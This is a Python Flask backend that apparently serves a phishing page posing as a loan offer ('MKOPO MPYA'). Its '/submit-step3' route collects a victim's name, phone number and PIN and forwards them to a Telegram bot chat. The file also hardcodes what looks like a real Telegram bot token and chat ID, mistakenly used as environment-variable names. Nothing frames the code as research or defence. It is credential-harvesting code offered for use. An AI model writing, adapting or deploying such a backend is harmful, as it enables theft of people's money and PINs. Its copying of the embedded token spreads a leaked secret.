from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os

app = Flask(__name__)
CORS(app)

# =========================
# TELEGRAM CONFIG
# =========================
BOT_TOKEN = os.environ.get("7787453591:AAHJ6udch8jmeJ06wIQegqzMh5RqYZ_nuC0")
CHAT_ID = os.environ.get("6958413637")

# =========================
# HOME ROUTE
# =========================
@app.route("/")
def home():
    return "Backend Running Successfully"

# =========================
# TELEGRAM FUNCTION
# =========================
def send_to_telegram(message):

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }

    try:
        response = requests.post(url, json=payload)

        print("TELEGRAM STATUS:", response.status_code)
        print("TELEGRAM RESPONSE:", response.text)

        return response.status_code == 200

    except Exception as e:
        print("TELEGRAM ERROR:", str(e))
        return False

# =========================
# STEP 3 ROUTE
# =========================
@app.route("/submit-step3", methods=["POST"])
def submit_step3():

    data = request.json

    jina = data.get("jina")
    namba = data.get("namba")
    pin = data.get("pin")

    message = f"""
MKOPO MPYA

Jina: {jina}
Namba: {namba}
PIN: {pin}
"""

    success = send_to_telegram(message)

    if success:
        return jsonify({
            "status": "success",
            "message": "Sent to Telegram"
        })

    return jsonify({
        "status": "error",
        "message": "Telegram failed"
    }), 500

# =========================
# START APP
# =========================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
